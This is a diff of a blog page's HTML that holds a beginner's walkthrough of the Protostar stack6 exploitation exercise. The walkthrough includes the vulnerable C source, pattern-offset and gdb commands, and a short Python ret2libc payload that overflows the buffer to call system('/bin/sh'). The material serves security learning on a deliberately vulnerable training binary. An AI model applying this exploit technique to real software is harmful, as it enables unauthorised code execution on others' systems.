@@ -103,7 +103,7 @@
     
     
     "mainEntityOfPage": "true",
-    "wordCount": "953"
+    "wordCount": "1005"
   }]
   </script>
 
@@ -333,13 +333,13 @@
   >
     <nav id="TableOfContents">
   <ul>
-    <li>
+    <li><a href="#bypassing-stack-pointer-restrictions-to-gain-arbitrary-code-execution">Bypassing stack pointer restrictions to gain arbitrary code execution</a>
       <ul>
-        <li>
-          <ul>
-            <li><a href="#bypassing-stack-pointer-restrictions-to-gain-arbitrary-code-execution">Bypassing stack pointer restrictions to gain arbitrary code execution</a></li>
-          </ul>
-        </li>
+        <li><a href="#source-code-analysis-and-some-recon">Source code analysis and some recon</a></li>
+        <li><a href="#logic-behind-the-non-executable-stack-protection">Logic behind the non-executable stack protection</a></li>
+        <li><a href="#ret2libc-exploit">ret2libc Exploit</a></li>
+        <li><a href="#developing-the-exploit">Developing the exploit</a></li>
+        <li><a href="#putting-together-a-python-exploit-script">Putting together a python exploit script</a></li>
       </ul>
     </li>
   </ul>
@@ -351,7 +351,7 @@
         </div>
       
       <div class="min-w-0 min-h-0 max-w-prose">
-        <h4 id="bypassing-stack-pointer-restrictions-to-gain-arbitrary-code-execution" class="relative group">Bypassing stack pointer restrictions to gain arbitrary code execution <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#bypassing-stack-pointer-restrictions-to-gain-arbitrary-code-execution" aria-label="Anchor">#</a></span></h4>
+        <h2 id="bypassing-stack-pointer-restrictions-to-gain-arbitrary-code-execution" class="relative group">Bypassing stack pointer restrictions to gain arbitrary code execution <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#bypassing-stack-pointer-restrictions-to-gain-arbitrary-code-execution" aria-label="Anchor">#</a></span></h2>
 <p>
 
 
@@ -367,31 +367,59 @@
 
 </p>
 <p><a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/"><em>Protostar</em></a> <em>is a series of beginner binary exploitation challenges which showcases concepts like basic stack-based buffer overflows, bypassing stack protections and even performing format string attacks. I tried out these challenges as I have close to 0 experience with binary exploitation and wanted to learn some of it and it turned out fun. So let’s get to</em> <a href="https://exploit.education/protostar/stack-six/"><em>protostar6</em></a> <em>and learn some ret2libc !</em></p>
-<p><strong>Source code analysis and some recon</strong></p>
+<h3 id="source-code-analysis-and-some-recon" class="relative group">Source code analysis and some recon <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#source-code-analysis-and-some-recon" aria-label="Anchor">#</a></span></h3>
 <p>We are given the source code below to protostar6.c</p>
-<p>As of previous challenges, our goal is get code execution on the target host which has the compiled binary of this source code. Some of the key things to understand here are:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">void</span> <span class="nf">getpath</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;input path please: &#34;</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+
+  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+
+  <span class="n">ret</span> <span class="o">=</span> <span class="n">__builtin_return_address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
+
+  <span class="k">if</span><span class="p">((</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="mh">0xbf000000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xbf000000</span><span class="p">)</span> <span class="p">{</span> 
+      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;bzzzt (%p)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span> 
+      <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;got path %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">getpath</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div><p>As of previous challenges, our goal is get code execution on the target host which has the compiled binary of this source code. Some of the key things to understand here are:</p>
 <ul>
 <li>
-<p><strong>gets(buffer) :</strong> The program will ask as for an input and store it an <strong>buffer of size 64 bytes.</strong> Gets is a vulnerable function in C that causes stack overflows</p>
+<p><code>gets(buffer) :</code> The program will ask as for an input and store it an <code>buffer of size 64 bytes.</code> Gets is a vulnerable function in C that causes stack overflows</p>
 </li>
 <li>
-<p><strong>ret</strong> : __builtin_return_address(0) - This function checks the <strong>current return address</strong> on the stack and sets it to a variable ret</p>
+<p><code>ret</code> : __builtin_return_address(0) - This function checks the current return address on the stack and sets it to a variable ret</p>
 </li>
 <li>
-<p><strong>if((ret &amp; 0xbf000000) == 0xbf000000) :</strong> This check performs a <strong>bitwise AND</strong> operation with the <strong>current address on the stack</strong> with the hex value <strong>0xbf000000</strong> and then compares it with 0xbf000000. Essentially what this means is that, it checks if the first byte in the return address is equal to 0xbf, since the remaining bytes will be converted to 0 in the AND operation.`<strong>Suppose our return address points to</strong> 0xbfffff01, the check is performed as follows**<br>
-Operation** |    <strong>HEX</strong>    |    <strong>Binary</strong><br>
+<p><code>if((ret &amp;amp; 0xbf000000) == 0xbf000000) :</code> This check performs a <code>bitwise AND</code> operation with the <code>current address on the stack</code> with the hex value <code>0xbf000000</code> and then compares it with 0xbf000000. Essentially what this means is that, it checks if the first byte in the return address is equal to 0xbf, since the remaining bytes will be converted to 0 in the AND operation.````Suppose our return address points to<code> 0xbfffff01, the check is performed as follows</code><br>
+Operation<code>|   </code>HEX<code>   |   </code>Binary```<br>
 <strong><strong><strong><strong><strong>|<em><strong><strong><strong><strong><strong>|</strong></strong></strong></strong></strong></em></strong></strong></strong></strong></strong>_____________________</p>
 <pre><code>   0xbfffff01 = 10111111 11111111 11111111 00000001  
 </code></pre>
-<p><strong>AND</strong>  0xbf000000 = 10111111 00000000 00000000 00000000</p>
+<p><code>AND</code>  0xbf000000 = 10111111 00000000 00000000 00000000</p>
 </li>
 </ul>
 <hr>
 <p>The AND operation gives 0xbf000000. So any address beginning with 0xbf will cause the condition to return to true and exit the program`</p>
 <ul>
-<li><strong>_exit(0) :</strong> A system call to exit the function if the operation above gives us an address beginning with 0xbf</li>
+<li><code>_exit(0) :</code> A system call to exit the function if the operation above gives us an address beginning with 0xbf</li>
 </ul>
-<p><strong>Logic behind the non-executable stack protection</strong></p>
+<h3 id="logic-behind-the-non-executable-stack-protection" class="relative group">Logic behind the non-executable stack protection <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#logic-behind-the-non-executable-stack-protection" aria-label="Anchor">#</a></span></h3>
 <p>In classic buffer overflows, our goal is usually to overwrite the instruction pointer / the return address with the address at the top of the stack where we put our shell code and get code execution.</p>
 <p>But in this case, if we were to overwrite the return address with an address on the stack , the operation fails and the program exits. Let us see why using gdb</p>
 <p>
@@ -409,9 +437,9 @@ Operation** |    <strong>HEX</strong>    |    <strong>Binary</strong><br>
 
 </p>
 <p>Running the program and viewing how the addresses are mapped in memory we see something interesting. All addresses in the stack begin with 0xbf thus hijacking the control flow and pointing to the stack will fail</p>
-<p><strong>ret2libc Exploit</strong></p>
+<h3 id="ret2libc-exploit" class="relative group">ret2libc Exploit <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#ret2libc-exploit" aria-label="Anchor">#</a></span></h3>
 <p>A ret2libc (return to libc, or return to the C library) attack is one in which the attacker does not require any shellcode to take control of a target, vulnerable process.</p>
-<p>“ Every time you write a C program, you use one or the other of the inbuilt functions, like <code>printf</code>, <code>scanf</code>, <code>puts</code> etc. Have you wondered where the definitions of these functions lie? All the standard C functions have been compiled into a single file, named <strong>the standard C library</strong> or the <code>libc</code>.You can use the <code>ldd</code> command to find out which libc is being used by an application. ”</p>
+<p>“ Every time you write a C program, you use one or the other of the inbuilt functions, like <code>printf</code>, <code>scanf</code>, <code>puts</code> etc. Have you wondered where the definitions of these functions lie? All the standard C functions have been compiled into a single file, named <code>the standard C library</code> or the <code>libc</code>.You can use the <code>ldd</code> command to find out which libc is being used by an application. ”</p>
 <p>
 
 
@@ -427,11 +455,13 @@ Operation** |    <strong>HEX</strong>    |    <strong>Binary</strong><br>
 
 </p>
 <p>We can leverage this technique by jumping to the return address of libc . libc has a syscall named <code>system</code> that we will use to execute ‘/bin/sh’ and gain shell</p>
-<p><strong>Developing the exploit</strong></p>
+<h3 id="developing-the-exploit" class="relative group">Developing the exploit <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#developing-the-exploit" aria-label="Anchor">#</a></span></h3>
 <ol>
-<li>We begin by finding the location of the EIP. Generate the crash pattern and supply in gdb<code>/usr/bin/msf-pattern_create -l 100   Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A</code></li>
+<li>We begin by finding the location of the EIP. Generate the crash pattern and supply in gdb</li>
 </ol>
-<ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">/usr/bin/msf-pattern_create -l <span class="m">100</span>  
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+</code></pre></div><ul>
 <li>
 <p>Supply the pattern and note down the address in the EIP
 
@@ -450,10 +480,12 @@ Operation** |    <strong>HEX</strong>    |    <strong>Binary</strong><br>
 </p>
 </li>
 <li>
-<p>Let us get the offset of the pattern<code>/usr/bin/msf-pattern_offset -l 100 -q 0x37634136   [*] Exact match at offset 80</code></p>
+<p>Let us get the offset of the pattern</p>
 </li>
 </ul>
-<ol start="2">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">/usr/bin/msf-pattern_offset -l <span class="m">100</span> -q 0x37634136  
+<span class="o">[</span>*<span class="o">]</span> Exact match at offset <span class="m">80</span>
+</code></pre></div><ol start="2">
 <li>Finding the address of libc</li>
 </ol>
 <ul>
@@ -476,7 +508,7 @@ Operation** |    <strong>HEX</strong>    |    <strong>Binary</strong><br>
 <ol start="3">
 <li>
 <p>Finding the address of the <code>system</code> syscall
-<code>(gdb) p system **&amp;lt;--- p means print**   $1 = {&amp;lt;text variable, no debug info&amp;gt;} 0xb7ecffb0 &amp;lt;__libc_system&amp;gt;   (gdb)</code></p>
+<code>(gdb) p system ```&amp;lt;--- p means print```   $1 = {&amp;lt;text variable, no debug info&amp;gt;} 0xb7ecffb0 &amp;lt;__libc_system&amp;gt;   (gdb)</code></p>
 </li>
 <li>
 <p>Finding the location of the ‘/bin/sh’ within libc
@@ -499,7 +531,7 @@ Operation** |    <strong>HEX</strong>    |    <strong>Binary</strong><br>
 <li>Then we load the address of the location of the ‘/bin/sh’ which will be <code>the libc address + offset of ‘/bin/sh’</code> that we found above.</li>
 <li>Now the next address on the stack will be pointing to the string <code>‘/bin/sh’ </code>which system executes as <code>system(‘/bin/sh’)</code> and gives a shell</li>
 </ul>
-<p><strong>Putting together a python exploit script</strong></p>
+<h3 id="putting-together-a-python-exploit-script" class="relative group">Putting together a python exploit script <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#putting-together-a-python-exploit-script" aria-label="Anchor">#</a></span></h3>
 <p>You could use pwntools for this but I will keep the walkthrough simple.
 <code>import struct``## EIP OFFSET   payload = &amp;#34;A&amp;#34;*80``## libc SYSTEM SYSCALL   system = struct.pack(&amp;#34;I&amp;#34;,0xb7ecffb0)``## Ret address after system   ret = &amp;#34;\x90&amp;#34; * 4``## libc /bin/sh   shell = struct.pack(&amp;#34;I&amp;#34;,0xb7e97000+0x11f3bf)``print (payload + system+ret+shell)</code></p>
 <p>We run the exploit and concatenate with the <code>cat</code> command to open an stdin stream so we have access to the shell we get</p>
